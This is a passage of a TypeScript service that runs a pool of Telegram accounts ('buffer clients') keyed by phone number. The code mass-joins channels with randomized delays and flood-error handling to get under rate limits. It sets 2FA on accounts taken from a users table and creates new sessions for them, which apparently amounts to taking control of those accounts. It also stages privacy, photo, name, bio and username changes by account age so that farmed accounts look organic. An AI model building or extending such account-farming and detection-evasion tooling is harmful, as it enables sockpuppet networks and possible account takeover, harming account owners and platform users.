this.logger.log(`Join process complete  Success: ${successCount}, Fail: ${failCount}`);\n        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;\n    }\n\n    async joinChannelQueue() {\n        this.logger.debug('Attempting to start join channel queue');\n        if (this.isJoinChannelProcessing) {\n            this.logger.warn('Join channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        // Start interval if not already running\n        if (!this.joinChannelIntervalId) {\n            this.logger.debug('Starting join channel interval');\n            this.joinChannelIntervalId = setInterval(async () => {\n                await this.processJoinChannelInterval();\n            }, this.JOIN_CHANNEL_INTERVAL);\n            this.activeTimeouts.add(this.joinChannelIntervalId);\n            // Schedule first execution after a short delay to avoid race condition\n            this.createTimeout(() => this.processJoinChannelInterval(), 1000);\n        } else {\n            this.logger.warn('Join channel interval is already running');\n        }\n    }\n\n    private async processJoinChannelInterval() {\n        if (this.isJoinChannelProcessing) {\n            this.logger.debug('Join channel process already running, skipping interval');\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, clearing interval');\n            this.clearJoinChannelInterval();\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n\n        try {\n            await this.processJoinChannelSequentially();\n        } catch (error) {\n            this.logger.error('Error in join channel queue', error);\n        } finally {\n            this.isJoinChannelProcessing = false;\n\n            // Clear interval if no more items to process\n            if (this.joinChannelMap.size === 0) {\n                this.logger.debug('No more channels to join, clearing interval');\n                this.clearJoinChannelInterval();\n            }\n        }\n    }\n\n    private async processJoinChannelSequentially() {\n        const keys = Array.from(this.joinChannelMap.keys());\n        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);\n\n        for (let i = 0; i < keys.length; i++) {\n            const mobile = keys[i];\n            let currentChannel: Channel | ActiveChannel | null = null;\n\n            try {\n                const channels = this.joinChannelMap.get(mobile);\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                    this.removeFromBufferMap(mobile);\n                    continue;\n                }\n\n                currentChannel = channels.shift();\n                if (!currentChannel) {\n                    this.logger.debug(`No channel to process for ${mobile}, removing from queue`);\n                    this.removeFromBufferMap(mobile);\n                    continue;\n                }\n                this.logger.debug(`${mobile} has ${channels.length} pending channels to join, processing:`, `@${currentChannel.username}`);\n                this.joinChannelMap.set(mobile, channels);\n                const activeChannel: ActiveChannel = await this.activeChannelsService.findOne(currentChannel.channelId);\n                if (activeChannel && activeChannel.banned === true) { // add DeletedCount  condition also if required\n                    this.logger.debug(`Skipping Channel ${activeChannel.channelId} as it is banned`);\n                    // Still add delay even when skipping to maintain rate limiting\n                    await sleep(5000 + Math.random() * 3000);\n                    continue;\n                } else {\n                    await this.telegramService.tryJoiningChannel(mobile, currentChannel);\n                }\n            } catch (error: unknown) {\n                const errorDetails = this.handleError(\n                    error,\n                    `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error`,\n                    mobile,\n                );\n                const errorMessage = error instanceof Error ? error.message : 'Unknown error';\n                this.logger.error(`Error joining channel for ${mobile}: ${errorMessage}`);\n\n                const errorObj = error as { errorMessage?: string };\n                if (\n                    errorDetails.error === 'FloodWaitError' ||\n                    errorObj.errorMessage === 'CHANNELS_TOO_MUCH'\n                ) {\n                    this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);\n                    this.removeFromBufferMap(mobile);\n\n                    try {\n                        await sleep(10000 + Math.random() * 5000); // Increased delay on FloodWaitError\n\n                        if (errorObj.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            await this.update(mobile, { channels: 400 });\n                        } else {\n                            const channelsInfo = await this.telegramService.getChannelInfo(\n                                mobile,\n                                true,\n                            );\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n                    } catch (updateError) {\n                        this.logger.error(`Error updating channel count for ${mobile}:`, updateError);\n                    }\n                }\n\n                if (isPermanentError(errorDetails)) {\n                    this.removeFromBufferMap(mobile);\n                    await this.markAsInactive(mobile, `${errorDetails.message}`);\n                }\n            } finally {\n                await this.safeUnregisterClient(mobile);\n\n                // Add delay between channel processing operations\n                if (i < keys.length - 1 || this.joinChannelMap.get(mobile)?.length > 0) {\n                    await sleep(this.CHANNEL_PROCESSING_DELAY + Math.random() * 10000);\n                } else {\n                    this.logger.log(`Not Sleeping before continuing with next Mobile`);\n                }\n            }\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.activeTimeouts.delete(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n        }\n        this.isJoinChannelProcessing = false;\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        const mapSize = this.leaveChannelMap.size;\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);\n    }\n\n    async leaveChannelQueue() {\n        this.logger.debug('Attempting to start leave channel queue');\n        if (this.isLeaveChannelProcessing) {\n            this.logger.warn('Leave channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        // Start interval if not already running\n        if (!this.leaveChannelIntervalId) {\n            this.logger.debug('Starting leave channel interval');\n            this.leaveChannelIntervalId = setInterval(async () => {\n                await this.processLeaveChannelInterval();\n            }, this.LEAVE_CHANNEL_INTERVAL);\n            this.activeTimeouts.add(this.leaveChannelIntervalId);\n            // Schedule first execution after a short delay to avoid race condition\n            this.createTimeout(() => this.processLeaveChannelInterval(), 1000);\n        } else {\n            this.logger.debug('Leave channel interval is already running');\n        }\n    }\n\n    private async processLeaveChannelInterval() {\n        if (this.isLeaveChannelProcessing) {\n            this.logger.debug('Leave channel process already running, skipping interval');\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, clearing interval');\n            this.clearLeaveChannelInterval();\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n\n        try {\n            await this.processLeaveChannelSequentially();\n        } catch (error) {\n            this.logger.error('Error in leave channel queue', error);\n        } finally {\n            this.isLeaveChannelProcessing = false;\n\n            // Clear interval if no more items to process\n            if (this.leaveChannelMap.size === 0) {\n                this.logger.debug('No more channels to leave, clearing interval');\n                this.clearLeaveChannelInterval();\n            }\n        }\n    }\n\n    private async processLeaveChannelSequentially() {\n        const keys = Array.from(this.leaveChannelMap.keys());\n        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);\n\n        for (let i = 0; i < keys.length; i++) {\n            const mobile = keys[i];\n\n            try {\n                const channels = this.leaveChannelMap.get(mobile);\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                    this.removeFromLeaveMap(mobile);\n                    continue;\n                }\n\n                const channelsToProcess = channels.splice(\n                    0,\n                    this.LEAVE_CHANNEL_BATCH_SIZE,\n                );\n                this.logger.debug(`${mobile} has ${channels.length} pending channels to leave, processing ${channelsToProcess.length} channels`);\n\n                // Only update map if there are remaining channels\n                if (channels.length > 0) {\n                    this.leaveChannelMap.set(mobile, channels);\n                } else {\n                    this.removeFromLeaveMap(mobile);\n                }\n                const client = await connectionManager.getClient(mobile, {\n                    autoDisconnect: false,\n                    handler: false,\n                });\n\n                this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);\n                await client.leaveChannels(channelsToProcess);\n                this.logger.debug(`${mobile} left ${channelsToProcess.length} channels successfully`);\n            } catch (error: unknown) {\n                const errorDetails = this.handleError(\n                    error,\n                    `${mobile} Leave Channel Error`,\n                    mobile,\n                );\n\n                if (isPermanentError(errorDetails)) {\n                    await this.markAsInactive(mobile, `${errorDetails.message}`);\n                    this.removeFromLeaveMap(mobile);\n                } else {\n                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);\n                }\n            } finally {\n                await this.safeUnregisterClient(mobile);\n\n                // Add delay between leave operations\n                if (\n                    i < keys.length - 1 ||\n                    this.leaveChannelMap.get(mobile)?.length > 0\n                ) {\n                    await sleep((this.LEAVE_CHANNEL_INTERVAL / 2) + Math.random() * 60000); // Half the interval as delay with randomness\n                }\n            }\n        }\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.activeTimeouts.delete(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n    async setAsBufferClient(\n        mobile: string,\n        clientId: string,\n        availableDate: string = ClientHelperUtils.getTodayDateString()\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false);\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map((client) => client?.mobile);\n\n        // Check if mobile is already an active client\n        if (clientMobiles.includes(mobile)) {\n            throw new BadRequestException('Number is an Active Client');\n        }\n\n        // If we reach here, buffer client doesn't exist (checked above) and mobile is not an active client\n        const telegramClient = await connectionManager.getClient(mobile, {\n            autoDisconnect: false\n        });\n        try {\n            await telegramClient.set2fa();\n            await sleep(30000 + Math.random() * 30000); // 30-60s delay for 2FA setup\n            const channels = await this.telegramService.getChannelInfo(mobile, true);\n            await sleep(5000 + Math.random() * 5000); // Delay before session creation\n            const newSession = await this.telegramService.createNewSession(user.mobile);\n            const bufferClient: CreateBufferClientDto = {\n                tgId: user.tgId,\n                session: newSession,\n                mobile: user.mobile,\n                availableDate,\n                channels: channels.ids.length,\n                clientId,\n                status: 'active',\n                message: 'Manually configured as buffer client',\n                lastUsed: null,\n            };\n            await this.bufferClientModel\n                .findOneAndUpdate({ mobile: user.mobile }, { $set: bufferClient }, { new: true, upsert: true })\n                .exec();\n        } catch (error) {\n            const errorDetails = parseError(error, `Failed to set as Buffer Client ${mobile}`);\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        }\n        await this.safeUnregisterClient(mobile);\n        return 'Client set as buffer successfully';\n    }\n\n    async checkBufferClients() {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n            return;\n        }\n        const clients = await this.clientService.findAll();\n        const promoteClients = await this.promoteClientService.findAll();\n\n        const clientMainMobiles = clients.map((c) => c.mobile);\n        const assignedBufferMobiles = await this.bufferClientModel\n            .find({ clientId: { $exists: true }, status: 'active' })\n            .distinct('mobile');\n\n        const goodIds = [\n            ...clientMainMobiles,\n            ...promoteClients.map((c) => c.mobile),\n            ...assignedBufferMobiles,\n        ].filter(Boolean);\n\n        const bufferClientsPerClient = new Map<string, number>();\n\n        const bufferClientCounts: { _id: string, count: number, mobiles: string[] }[] = await this.bufferClientModel.aggregate([\n            {\n                $match: {\n                    clientId: { $exists: true, $ne: null },\n                    status: 'active',\n                },\n            },\n            {\n                $group: {\n                    _id: '$clientId',\n                    count: { $sum: 1 },\n                    mobiles: { $push: '$mobile' },\n                },\n            },\n        ]);\n        let totalUpdates = 0;\n        const MIN_COOLDOWN_HOURS = 2; // Match processBufferClient cooldown\n        const MAX_UPDATES_PER_CYCLE = 5; // Increased to prevent starvation\n        const now = Date.now();\n        this.logger.debug(`Checking buffer clients, good IDs count: ${goodIds.length}`)\n\n        // Collect all buffer clients with their metadata for priority sorting\n        const bufferClientsToProcess: Array<{\n            bufferClient: BufferClientDocument;\n            client: Client;\n            clientId: string;\n            priority: number;\n        }> = [];\n\n        for (const result of bufferClientCounts) {\n            bufferClientsPerClient.set(result._id, result.count);\n            const client = clients.find((c) => c.clientId === result._id);\n            if (!client) {\n                this.logger.warn(`Client with ID ${result._id} not found, skipping buffer clients`);\n                continue;\n            }\n            for (const bufferClientMobile of result.mobiles) {\n                const bufferClient = await this.findOne(bufferClientMobile, false);\n                if (!bufferClient) {\n                    this.logger.warn(`Buffer client ${bufferClientMobile} not found, skipping`);\n                    continue;\n                }\n\n                // Check if in use\n                if (bufferClient.inUse === true) {\n                    this.logger.debug(`Skipping ${bufferClientMobile} - currently in use`);\n                    continue;\n                }\n\n                // Health check: verify client is still alive (check every 7 days)\n                const lastChecked = bufferClient.lastChecked\n                    ? new Date(bufferClient.lastChecked).getTime()\n                    : 0;\n                const healthCheckPassed = await this.performHealthCheck(bufferClientMobile, lastChecked, now);\n                if (!healthCheckPassed) {\n                    this.logger.debug(`${bufferClientMobile} has permanent error, continueing with next buffer client!`);\n                    continue; // Skip to next client if health check failed permanently\n                }\n\n                // Skip clients that have been used (updates were done manually)\n                // But backfill their timestamps for record keeping\n                if (bufferClient.lastUsed) {\n                    const lastUsed = ClientHelperUtils.getTimestamp(bufferClient.lastUsed);\n                    if (lastUsed > 0) {\n                        // Backfill timestamps for used clients\n                        await this.backfillTimestamps(bufferClientMobile, bufferClient, now);\n                        this.logger.debug(`Skipping ${bufferClientMobile} - already used, trying timestamps backfill`);\n                        continue;\n                    }\n                }\n\n                // Check cooldown before processing\n                const lastUpdateAttempt = bufferClient.lastUpdateAttempt\n                    ? new Date(bufferClient.lastUpdateAttempt).getTime()\n                    : 0;\n                if (lastUpdateAttempt && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {\n                    const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);\n                    this.logger.debug(`Skipping ${bufferClientMobile} - on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);\n                    continue;\n                }\n\n                // Calculate priority for sorting\n                const pendingUpdates = this.getPendingUpdates(bufferClient, now);\n                const accountAge = bufferClient.createdAt ? now - new Date(bufferClient.createdAt).getTime() : 0;\n                const DAY = this.ONE_DAY_MS;\n                const failedAttempts = bufferClient.failedUpdateAttempts || 0;\n\n                // Priority calculation:\n                // 1. More pending updates = higher priority (multiply by 10000 for highest weight)\n                // 2. Older lastUpdateAttempt = higher priority (stuck clients) - use hours since last attempt\n                // 3. Fewer failed attempts = higher priority (subtract penalty)\n                // 4. Never attempted clients get maximum priority boost\n                const lastAttemptAgeHours = lastUpdateAttempt > 0\n                    ? (now - lastUpdateAttempt) / (60 * 60 * 1000) // Hours since last attempt\n                    : 10000; // Never attempted = very high priority\n\n                const priority =\n                    (pendingUpdates.totalPending * 10000) + // Most important: pending updates\n                    lastAttemptAgeHours + // Older attempts = higher priority\n                    (accountAge / DAY) - // Older accounts slightly higher priority\n                    (failedAttempts * 100); // Fewer failures = higher priority\n\n                bufferClientsToProcess.push({\n                    bufferClient,\n                    client,\n                    clientId: result._id,\n                    priority\n                });\n            }\n        }\n\n        // Sort by priority (highest first)\n        bufferClientsToProcess.sort((a, b) => b.priority - a.priority);\n\n        this.logger.debug(`Processing ${bufferClientsToProcess.length} buffer clients in priority order`);\n\n        // Process in priority order\n        for (const { bufferClient, client, clientId } of bufferClientsToProcess) {\n            if (totalUpdates >= MAX_UPDATES_PER_CYCLE) {\n                this.logger.warn(`Reached total update limit of ${MAX_UPDATES_PER_CYCLE} for this check cycle`);\n                break;\n            }\n\n            const currentUpdates = await this.processBufferClient(bufferClient, client);\n            this.logger.debug(`Processed buffer client ${bufferClient.mobile} for client ${clientId}, current updates: ${currentUpdates} | total updates: ${totalUpdates + currentUpdates}`);\n            if (currentUpdates > 0) {\n                totalUpdates += currentUpdates;\n            }\n        }\n\n        // NEW: Calculate availability-based needs for each client (dynamic, no hard limit)\n        const clientNeedingBufferClients: Array<{\n            clientId: string;\n            totalNeeded: number;\n            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n            totalActive: number;\n            totalNeededForCount: number;\n            calculationReason: string;\n            priority: number;\n        }> = [];\n\n        for (const client of clients) {\n            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(client.clientId);\n\n            if (availabilityNeeds.totalNeeded > 0) {\n                clientNeedingBufferClients.push({\n                    clientId: client.clientId,\n                    ...availabilityNeeds\n                });\n            }\n        }\n\n        // Sort by priority (most urgent first: today=0, tomorrow=1, oneWeek=7, tenDays=10, countOnly=100)\n        clientNeedingBufferClients.sort((a, b) => a.priority - b.priority);\n\n        // Calculate total slots needed (rate-limited per trigger, but no per-client limit)\n        let totalSlotsNeeded = 0;\n        const clientNeedsMap = new Map<string, number>();\n\n        for (const clientNeed of clientNeedingBufferClients) {\n            // No per-client limit check - only global rate limit per trigger\n            const allocated = Math.min(\n                clientNeed.totalNeeded,\n                this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER - totalSlotsNeeded\n            );\n            if (allocated > 0) {\n                clientNeedsMap.set(clientNeed.clientId, allocated);\n                totalSlotsNeeded += allocated;\n            }\n            if (totalSlotsNeeded >= this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER) break;\n        }\n\n        // Enhanced logging to show availability status\n        this.logger.debug(`Availability-based needs calculated (NO HARD LIMIT):`);\n        clientNeedingBufferClients.forEach(need => {\n            this.logger.debug(\n                `Client ${need.clientId} (priority: ${need.priority}): ` +\n                `${need.totalActive} total active, ${need.totalNeeded} new needed - ${need.calculationReason}`\n            );\n            need.windowNeeds.forEach(window => {\n                if (window.needed > 0) {\n                    this.logger.debug(\n                        `  - ${window.window} (${window.targetDate}): ` +\n                        `${window.available} available, ${window.needed} needed ` +\n                        `(target: ${window.minRequired} per window)`\n                    );\n                } else {\n                    this.logger.debug(\n                        `  - ${window.window} (${window.targetDate}): ` +\n                        `${window.available} available  (sufficient, target: ${window.minRequired})`\n                    );\n                }\n            });\n        });\n\n        const totalActiveBufferClients = await this.bufferClientModel.countDocuments({ status: 'active' });\n        this.logger.debug(`Total active buffer clients: ${totalActiveBufferClients}`);\n        this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER} per trigger)`);\n\n        // Build notification message\n        const clientNeedsSummary = clientNeedingBufferClients\n            .map(c => `${c.clientId}: ${c.totalNeeded} (${c.calculationReason})`)\n            .join('\\n');\n\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Buffer Client Check (Dynamic Availability):\\n\\nTotal Active Buffer Clients: ${totalActiveBufferClients}\\nBuffer Clients Per Client: ${JSON.stringify(Object.fromEntries(bufferClientsPerClient))}\\n\\nClients Needing Buffer Clients:\\n${clientNeedsSummary || 'None'}\\n\\nTotal Slots Needed: ${totalSlotsNeeded}`)}`);\n\n        if (clientNeedingBufferClients.length > 0 && totalSlotsNeeded > 0) {\n            await this.addNewUserstoBufferClientsDynamic(\n                [],\n                goodIds,\n                clientNeedingBufferClients,\n                bufferClientsPerClient\n            );\n        } else {\n            this.logger.debug('No new buffer clients needed - all availability windows and total count satisfied');\n        }\n    }\n\n    /**\n     * Helper to safely get timestamp from date field\n     */\n\n    /**\n     * Helper method to update user 2FA status\n     * Handles errors gracefully with consistent logging\n     */\n    private async updateUser2FAStatus(tgId: string, mobile: string): Promise<void> {\n        try {\n            await this.usersService.update(tgId, { twoFA: true });\n        } catch (userUpdateError) {\n            this.logger.warn(`Failed to update user 2FA status for ${mobile}:`, userUpdateError);\n        }\n    }\n\n    /**\n     * Calculate availability-based buffer client needs for a specific client\n     * Checks availability across multiple time windows (today, tomorrow, 1 week, 10 days)\n     * Returns how many new buffer clients are needed to maintain minimum availability\n     * \n     * Key: availableDate means \"available from\" - client is available on/after that date\n     * Includes inUse clients in availability count (they're still available, just currently in use)\n     * \n     * @param clientId - Client ID to calculate needs for\n     * @returns Object with total needed, window details, and calculation reason\n     */\n    private async calculateAvailabilityBasedNeeds(\n        clientId: string\n    ): Promise<{\n        totalNeeded: number;\n        windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n        totalActive: number;\n        totalNeededForCount: number;\n        calculationReason: string;\n        priority: number;\n    }> {\n        const today = new Date();\n        today.setHours(0, 0, 0, 0);\n        const todayStr = today.toISOString().split('T')[0];\n\n        const windows = this.AVAILABILITY_WINDOWS.map(window => ({\n            ...window,\n            targetDate: new Date(today.getTime() + window.days * this.ONE_DAY_MS)\n                .toISOString().split('T')[0]\n        }));\n\n        // Get total active count (includes inUse clients)\n        const totalActive = await this.bufferClientModel.countDocuments({\n            clientId,\n            status: 'active'\n        });\n\n        const windowNeeds = [];\n        let maxNeeded = 0;\n        let mostUrgentWindow = '';\n        let mostUrgentPriority = 999;\n\n        for (const window of windows) {\n            // Count how many buffer clients are available on or before this window's date\n            // Key: availableDate <= targetDate means available on/after that date\n            // Include inUse clients (they're still available, just currently in use)\n            const availableCount = await this.bufferClientModel.countDocuments({\n                clientId,\n                status: 'active',\n                // NOTE: NOT excluding inUse - they count as available\n                availableDate: { $lte: window.targetDate } // Available on/after this date\n            });\n\n            const needed = Math.max(0, window.minRequired - availableCount);\n\n            windowNeeds.push({\n                window: window.name,\n                available: availableCount,\n                needed,\n                targetDate: window.targetDate,\n                minRequired: window.minRequired\n            });\n\n            // Track which window needs the most and is most urgent\n            if (needed > maxNeeded) {\n                maxNeeded = needed;\n                mostUrgentWindow = window.name;\n                mostUrgentPriority = window.days;\n            } else if (needed > 0 && window.days < mostUrgentPriority) {\n                // If same need level, prioritize more urgent window\n                mostUrgentWindow = window.name;\n                mostUrgentPriority = window.days;\n            }\n        }\n\n        // Check total count requirement\n        const totalNeededForCount = Math.max(0, this.MIN_TOTAL_BUFFER_CLIENTS - totalActive);\n\n        // Calculate total needed: max of window needs OR total count needs\n        const totalNeeded = Math.max(maxNeeded, totalNeededForCount);\n\n        // Calculate priority: most urgent window that needs clients, or 100 if only count needed\n        let priority = 100; // Default: low priority (only count needed)\n        if (maxNeeded > 0) {\n            priority = mostUrgentPriority; // Use days of most urgent window (0=today, 1=tomorrow, etc.)\n        }\n\n        // Build calculation reason for logging\n        let calculationReason = '';\n        if (maxNeeded > 0 && totalNeededForCount > 0) {\n            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded}, total count needs ${totalNeededForCount}`;\n        } else if (maxNeeded > 0) {\n            const windowConfig = this.AVAILABILITY_WINDOWS.find(w => w.name === mostUrgentWindow);\n            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded} to meet minimum of ${windowConfig?.minRequired || 'unknown'}`;\n        } else if (totalNeededForCount > 0) {\n            calculationReason = `Total count needs ${totalNeededForCount} to reach minimum of ${this.MIN_TOTAL_BUFFER_CLIENTS}`;\n        } else {\n            calculationReason = 'All windows satisfied';\n        }\n\n        return {\n            totalNeeded,\n            windowNeeds,\n            totalActive,\n            totalNeededForCount,\n            calculationReason,\n            priority\n        };\n    }\n\n    /**\n     * Backfill missing timestamp fields for clients that have been used\n     * Sets historical timestamps for accounts that were used before timestamp tracking was implemented\n     * @param mobile - Mobile number of the buffer client\n     * @param doc - Buffer client document\n     * @param now - Current timestamp in milliseconds\n     */\n    private async backfillTimestamps(mobile: string, doc: BufferClient, now: number): Promise<void> {\n        const needsBackfill = !doc.privacyUpdatedAt || !doc.profilePicsDeletedAt ||\n            !doc.nameBioUpdatedAt || !doc.usernameUpdatedAt ||\n            !doc.profilePicsUpdatedAt;\n\n        if (!needsBackfill) {\n            this.logger.debug(`Skipping timestamp backfill for ${mobile} (already has all timestamps)`);\n            return\n        };\n\n        this.logger.log(`Backfilling timestamp fields for ${mobile}`);\n\n        const allTimestamps = ClientHelperUtils.createBackfillTimestamps(now, this.ONE_DAY_MS);\n        const backfillData: UpdateBufferClientDto = {};\n\n        if (!doc.privacyUpdatedAt) backfillData.privacyUpdatedAt = allTimestamps.privacyUpdatedAt;\n        if (!doc.profilePicsDeletedAt) backfillData.profilePicsDeletedAt = allTimestamps.profilePicsDeletedAt;\n        if (!doc.nameBioUpdatedAt) backfillData.nameBioUpdatedAt = allTimestamps.nameBioUpdatedAt;\n        if (!doc.usernameUpdatedAt) backfillData.usernameUpdatedAt = allTimestamps.usernameUpdatedAt;\n        if (!doc.profilePicsUpdatedAt) backfillData.profilePicsUpdatedAt = allTimestamps.profilePicsUpdatedAt;\n\n        await this.update(mobile, backfillData);\n        this.logger.log(`Backfilled ${Object.keys(backfillData).length} timestamp fields for ${mobile}`);\n    }\n\n    /**\n     * Perform health check on a buffer client\n     * Verifies account is still alive and updates lastChecked\n     * @param mobile - Client mobile number\n     * @param lastChecked - Timestamp of last health check (0 if never checked)\n     * @param now - Current timestamp\n     * @returns true if health check passed, false otherwise\n     */\n    private async performHealthCheck(mobile: string, lastChecked: number, now: number): Promise<boolean> {\n        const needsHealthCheck = !lastChecked || (now - lastChecked > 7 * this.ONE_DAY_MS);\n\n        if (!needsHealthCheck) {\n            this.logger.debug(`Health check not needed for ${mobile} (last checked: ${new Date(lastChecked).toISOString()})`);\n            return true; // Health check not needed yet\n        }\n\n        try {\n            const telegramClient = await connectionManager.getClient(mobile, {\n                autoDisconnect: false,\n                handler: false,\n            });\n            await telegramClient.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [new Api.InputPrivacyValueDisallowAll()],\n                })\n            );\n            const channels = await channelInfo(telegramClient.client, true);\n            await this.update(mobile, {\n                channels: channels.ids.length,\n                lastChecked: new Date()\n            });\n            this.logger.debug(`Health check PASSED for ${mobile}`);\n            await sleep(5000);\n            return true;\n        } catch (error) {\n            const errorDetails = this.handleError(error, 'Health check failed', mobile);\n            this.logger.warn(`Health check failed for ${mobile}: ${errorDetails.message}`);\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(mobile, `Health check failed: ${errorDetails.message}`);\n            }\n            await sleep(5000);\n            return false;\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n\n    /**\n     * Check which updates are pending for a buffer client\n     */\n    private getPendingUpdates(doc: BufferClient, now: number): {\n        needsPrivacy: boolean;\n        needsDeletePhotos: boolean;\n        needsNameBio: boolean;\n        needsUsername: boolean;\n        needsProfilePhotos: boolean;\n        totalPending: number;\n        reasons: string[];\n    } {\n        const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;\n        const DAY = this.ONE_DAY_MS;\n        const MIN_DAYS_BETWEEN_UPDATES = DAY;\n        const reasons: string[] = [];\n\n        // Privacy update - accounts 1+ days old, not updated in last 15 days\n        const privacyTimestamp = ClientHelperUtils.getTimestamp(doc.privacyUpdatedAt);\n        const needsPrivacy = accountAge >= DAY &&\n            (privacyTimestamp === 0 || privacyTimestamp < now - 15 * DAY);\n        if (needsPrivacy) reasons.push('Privacy update needed');\n\n        // Delete photos - needs privacy done at least 1 day ago\n        const privacyDone = privacyTimestamp > 0 && (now - privacyTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const photosDeletedTimestamp = ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt);\n        const needsDeletePhotos = accountAge >= 2 * DAY &&\n            (photosDeletedTimestamp === 0 || photosDeletedTimestamp < now - 30 * DAY) &&\n            (privacyDone || privacyTimestamp === 0);\n        if (needsDeletePhotos) reasons.push('Delete photos needed');\n\n        // Name/Bio - needs photos deleted at least 1 day ago, 100+ channels\n        const photosDone = photosDeletedTimestamp > 0 && (now - photosDeletedTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const nameBioTimestamp = ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt);\n        const needsNameBio = accountAge >= 3 * DAY &&\n            (doc.channels || 0) > 100 &&\n            (nameBioTimestamp === 0 || nameBioTimestamp < now - 30 * DAY) &&\n            (photosDone || photosDeletedTimestamp === 0);\n        if (needsNameBio) reasons.push('Name/Bio update needed');\n\n        // Username - needs name/bio done at least 1 day ago, 150+ channels\n        const nameBioDone = nameBioTimestamp > 0 && (now - nameBioTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const usernameTimestamp = ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt);\n        const needsUsername = accountAge >= 7 * DAY &&\n            (doc.channels || 0) > 150 &&\n            (usernameTimestamp === 0 || usernameTimestamp < now - 30 * DAY) &&\n            (nameBioDone || nameBioTimestamp === 0);\n        if (needsUsername) reasons.push('Username update needed');\n\n        // Profile photos - needs username done at least 1 day ago, 170+ channels\n        const usernameDone = usernameTimestamp > 0 && (now - usernameTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const profilePicsTimestamp = ClientHelperUtils.getTimestamp(doc.profilePicsUpdatedAt);\n        const needsProfilePhotos = accountAge >= 10 * DAY &&\n            (doc.channels || 0) > 170 &&\n            (profilePicsTimestamp === 0 || profilePicsTimestamp < now - 30 * DAY) &&\n            (usernameDone || usernameTimestamp === 0);\n        if (needsProfilePhotos) reasons.push('Profile photos update needed');\n\n        const totalPending = [needsPrivacy, needsDeletePhotos, needsNameBio, needsUsername, needsProfilePhotos]\n            .filter(Boolean).length;\n\n        return {\n            needsPrivacy,\n            needsDeletePhotos,\n            needsNameBio,\n            needsUsername,\n            needsProfilePhotos,\n            totalPending,\n            reasons\n        };\n    }\n\n    /**\n     * Update privacy settings for a buffer client\n     */\n    private async updatePrivacySettings(doc: BufferClient, client: Client, failedAttempts: number): Promise<number> {\n        const 